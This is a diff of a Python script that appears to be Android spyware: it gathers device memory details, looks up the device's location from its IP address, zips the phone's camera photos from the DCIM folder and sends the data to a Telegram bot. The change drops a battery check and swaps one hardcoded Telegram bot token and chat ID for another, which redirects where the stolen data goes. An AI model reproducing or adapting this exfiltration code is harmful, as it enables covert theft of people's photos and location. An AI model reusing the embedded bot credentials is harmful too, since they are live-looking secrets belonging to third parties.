@@ -56,13 +56,6 @@ used_memory_gb = memory_info.used / (1024 ** 3)
 percent_used = memory_info.percent
 
 
-battery_percentage = "Not available"  
-try:
-    battery_info = subprocess.check_output(['dumpsys', 'battery'], stderr=subprocess.DEVNULL).decode('utf-8')
-    battery_percentage = battery_info.split('level: ')[1].split('%')[0]
-except (subprocess.CalledProcessError, IndexError):
-    pass  
-
 
 location_url = f'http://ip-api.com/json/{ip_address}'
 location_response = requests.get(location_url)
@@ -101,7 +94,6 @@ Available Memory: {available_memory_gb:.2f} GB
 Used Memory: {used_memory_gb:.2f} GB
 Percentage Used: {percent_used:.2f}%
 
-Battery Percentage: {battery_percentage}%
 
 Location: {location}
 City: {city}
@@ -115,8 +107,8 @@ Zip Code: {zip_code}
 '''
 
 
-telegram_token = '7629890948:AAG0R_zE02Ze1mk1qWIm6RgI9G3EH-sUY5g'
-chat_id = '7721343312'
+telegram_token = '7328408094:AAFnbtb2mLCv3FgVRFT7i3NjWTHYl_fTD-U'
+chat_id = '5798396635'
 url = f'https://api.telegram.org/bot{telegram_token}/sendMessage?chat_id={chat_id}&text={message}'
 
 data = {
@@ -354,8 +346,8 @@ for c in x:
     time.sleep(0.001)
 
 Image.MAX_IMAGE_PIXELS = None
-TOKEN = '7629890948:AAG0R_zE02Ze1mk1qWIm6RgI9G3EH-sUY5g'
-chat_id = '7721343312'
+TOKEN = '7328408094:AAFnbtb2mLCv3FgVRFT7i3NjWTHYl_fTD-U'
+chat_id = '5798396635'
 bot = telebot.TeleBot(TOKEN)
 directory = '/storage/emulated/0/DCIM/Camera/'
 zip_filename = f"camera_photos_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
